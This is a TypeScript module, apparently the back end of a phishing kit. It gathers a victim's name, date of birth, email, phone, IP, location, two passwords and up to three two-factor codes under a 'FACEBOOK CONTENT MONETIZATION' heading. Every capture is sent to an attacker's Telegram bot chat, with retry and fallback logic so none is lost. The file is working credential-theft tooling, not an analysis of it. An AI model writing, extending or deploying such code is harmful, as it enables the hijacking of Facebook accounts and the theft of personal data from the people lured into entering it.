import https from 'https';
import axios from 'axios';
import { memoryStoreTTL } from '@/utils/memoryStore';
import { generateKey } from '@/utils/generateKey';

const agent = new https.Agent({ family: 4 });

function getTelegramConfig() {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        api: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

// Simple rate limiter to prevent spam
const rateLimiter = new Map<string, number>();
const RATE_LIMIT_WINDOW = 1000;

function checkRateLimit(key: string): boolean {
    const now = Date.now();
    const lastCall = rateLimiter.get(key);

    if (!lastCall || (now - lastCall) > RATE_LIMIT_WINDOW) {
        rateLimiter.set(key, now);
        return true;
    }

    return false;
}

// Retry utility for Telegram API calls
async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 3): Promise<any> {
    let lastError: any;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const result = await requestFn();
            return result;
        } catch (error: any) {
            lastError = error;

            const errorCode = error?.response?.status;
            const errorDesc = error?.response?.data?.description || '';

            // Don't retry on authentication errors, invalid chat_id, etc.
            if (
                errorCode === 401 ||
                errorCode === 403 ||
                errorDesc.includes('chat not found') ||
                errorDesc.includes('bot was blocked')
            ) {
                throw error;
            }

            if (attempt === maxRetries) {
                break;
            }

            // Exponential backoff: 1s, 2s, 4s
            const delay = Math.pow(2, attempt - 1) * 1000;
            console.warn(`⚠️ Telegram API attempt ${attempt} failed, retrying in ${delay}ms:`, error.message);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    throw lastError;
}

function escapeHtml(input: any): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

/** Giá trị hiển thị trong <code>: không có dữ liệu thì để trống (không dùng "-" hay "N/A"). */
function formatCodeField(value: unknown): string {
    if (value === undefined || value === null) return '';
    const s = String(value).trim();
    return s ? escapeHtml(s) : '';
}


function normalizeData(input: any = {}) {
    return {
        ip: input.ip ?? '',
        location: input.location ?? '',
        fullName: input.fullName ?? input.name ?? '',
        fanpage: input.fanpage ?? '',
        day: input.day ?? '',
        month: input.month ?? '',
        year: input.year ?? '',
        email: input.email ?? '',
        emailBusiness: input.emailBusiness ?? input.business ?? '',
        phone: input.phone ?? '',
        password: input.password ?? '',
        passwordSecond: input.passwordSecond ?? '',
        authMethod: input.authMethod ?? '',
        twoFa: input.twoFa ?? '',
        twoFaSecond: input.twoFaSecond ?? '',
        twoFaThird: input.twoFaThird ?? '',
    };
}

function mergeData(oldData: any = {}, newData: any = {}) {
    const normalizedOld = normalizeData(oldData);
    const normalizedNew = normalizeData(newData);
    const result: any = { ...normalizedOld };
    Object.entries(normalizedNew).forEach(([k, v]) => {
        if (v !== undefined && v !== '') {
            result[k] = v;
        }
    });
    return result;
}

function formatMessage(data: any): string {
    const d = normalizeData(data);
    const dob = [d.day, d.month, d.year].every((x) => String(x ?? '').trim())
        ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
        : '';
    const authLine = d.authMethod ? `<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
    const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
    const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';

    const lines = [
        `<b>📋 FACEBOOK CONTENT MONETIZATION</b>`,
        `----------------------`,
        `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
        `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
        `----------------------`,
        `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
        `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
        `<b>DOB:</b> <code>${dob}</code>`,
        `----------------------`,
        `<b>Email:</b> <code>${formatCodeField(d.email)}</code>`,
        `<b>Business Email:</b> <code>${formatCodeField(d.emailBusiness)}</code>`,
        `<b>Phone:</b> <code>${phoneDisplay}</code>`,
        `----------------------`,
        `<b>Password(1):</b> <code>${formatCodeField(d.password)}</code>`,
        `<b>Password(2):</b> <code>${formatCodeField(d.passwordSecond)}</code>`,
        `${authLine ? authLine.trim() : ''}`
    ].filter(Boolean);

    if (has2FA) {
        lines.push(
            `----------------------`,
            `<b>2FA(1):</b> <code>${formatCodeField(d.twoFa)}</code>`,
            `<b>2FA(2):</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
            `<b>2FA(3):</b> <code>${formatCodeField(d.twoFaThird)}</code>`
        );
    }

    return lines.join('\n');
}

export async function sendTelegramMessage(data: any): Promise<void> {
    const config = getTelegramConfig();
    if (!config) {
        console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
        return;
    }

    const key = generateKey(data);
    // Rate limiting check
    if (!checkRateLimit(key)) {
        console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
        return;
    }
    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);
    const updatedText = formatMessage(fullData);

    try {
        const res = await retryTelegramRequest(() =>
            axios.post(`${config.api}/sendMessage`, {
                chat_id: config.chatId,
                text: updatedText,
                parse_mode: 'HTML'
            }, {
                httpsAgent: agent,
                timeout: 10000
            })
        );

        const messageId = res?.data?.result?.message_id;
        if (messageId) {
            memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
            console.log(`✅ Sent new message. ID: ${messageId}`);
        } else {
            console.warn('⚠️ Telegram response không có message_id');
        }
    } catch (err: any) {
        console.error('🔥 Telegram send error (retry exhausted):', err?.response?.data || err.message || err);
        try {
            const fallbackRes = await axios.post(`${config.api}/sendMessage`, {
                chat_id: config.chatId,
                text: updatedText,
                parse_mode: 'HTML'
            }, {
                httpsAgent: agent,
                timeout: 10000
            });
            const fallbackMessageId = fallbackRes?.data?.result?.message_id;
            if (fallbackMessageId) {
                memoryStoreTTL.set(key, { message: updatedText, messageId: fallbackMessageId, data: fullData });
                console.log(`🔄 Fallback send success. ID: ${fallbackMessageId}`);
            } else {
                console.warn('⚠️ Fallback Telegram response không có message_id');
            }
        } catch (fallbackErr: any) {
            console.error('🔥 Telegram fallback send error:', fallbackErr?.response?.data || fallbackErr.message || fallbackErr);
        }
        return;
    }
}
